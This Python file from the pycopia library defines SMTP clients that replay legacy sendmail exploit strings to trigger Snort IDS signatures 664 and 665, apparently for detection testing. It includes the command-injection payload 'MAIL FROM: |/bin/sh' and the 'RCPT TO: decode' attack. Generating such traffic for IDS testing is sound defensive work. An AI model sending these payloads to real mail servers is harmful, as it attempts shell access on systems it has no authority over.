#!/usr/bin/python
# -*- coding: ascii -*-
# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab
# License: LGPL
# Keith Dart <keith@dartworks.biz>

"""
Clients used to test various SMTP related exploits.

"""

from pycopia import protocols
from pycopia import clientserver


class SMTPExploitTest(protocols.Protocol):
    EOL = "\r\n"

    def initialize(self, fsm):
        fsm.set_default_transition(self._bye, fsm.RESET)
        fsm.add_regex("220 (.*)", fsm.RESET, self._greet, 1)
        fsm.add_regex("250 (.*)", 1, self._mail, 2)
        fsm.add_regex("503 (.*)", 2, self._quit, 6)
        fsm.add_regex("553 (.*)", 2, self._quit, 6)
        fsm.add_regex("250 (.*)", 2, self._rcpt, 3)
        fsm.add_regex("250 (.*)", 3, self._data, 4)
        fsm.add_regex("503 (.*)", 3, self._quit, 6)
        fsm.add_regex("354 (.*)", 4, self._send, 5)
        fsm.add_regex("250 (.*)", 5, self._quit, 6)
        fsm.add_regex("221 (.*)", 6, self._goodbye, fsm.RESET)

    def writeeol(self, data):
        self.iostream.write(data+"\r\n")

    def _bye(self, mo):
        self.iostream.close()
        raise protocols.ProtocolExit(1)

    def _goodbye(self, mo):
        self.iostream.close()
        raise protocols.ProtocolExit(0)

    def _greet(self, mo):
        self.writeeol("HELO somewhere.com")

    def _mail(self, mo):
        self.writeeol("MAIL FROM: <yourstruly@somewhere.com>")

    def _rcpt(self, mo):
        self.writeeol("RCPT TO: <postmaster>")

    def _quit(self, mo):
        self.writeeol("QUIT")

    def _data(self, mo):
        self.writeeol("DATA")

    def _send(self, mo):
        self.writeeol("""From: "Yours Truly" <yourstruly@somewhere.com>
To: <postmaster@somewhere.com>

Message body.
""".replace("\n", "\r\n"))
        self.writeeol('.')


class SMTPClient(clientserver.TCPClient):
    port = 25
    altport = 9025


# (msg:"SMTP RCPT TO decode attempt"; flow:to_server,established; content:"rcpt
# to|3A|"; nocase; content:"decode"; distance:0; nocase; pcre:"/^rcpt
# to\:\s*decode/smi"; reference:arachnids,121; reference:bugtraq,2308;
# reference:cve,1999-0203; classtype:attempted-admin; sid:664; rev:15;)
class Snort664(SMTPExploitTest):
    def _rcpt(self, mo):
        self.writeeol("RCPT TO: decode")


# (msg:"SMTP sendmail 5.6.5 exploit"; flow:to_server,established; content:"MAIL
# FROM|3A| |7C|/usr/ucb/tail"; nocase; reference:arachnids,122;
# reference:bugtraq,2308; reference:cve,1999-0203; classtype:attempted-user;
# sid:665; rev:8;)
class Snort665(SMTPExploitTest):
    def _mail(self, mo):
        self.writeeol("MAIL FROM: |/bin/sh")


if __name__ == "__main__":
    from pycopia import autodebug
    proto = Snort664()
    client = clientserver.get_client(SMTPClient, "localhost", proto, port=SMTPClient.altport)
    client.run()
    client.close()

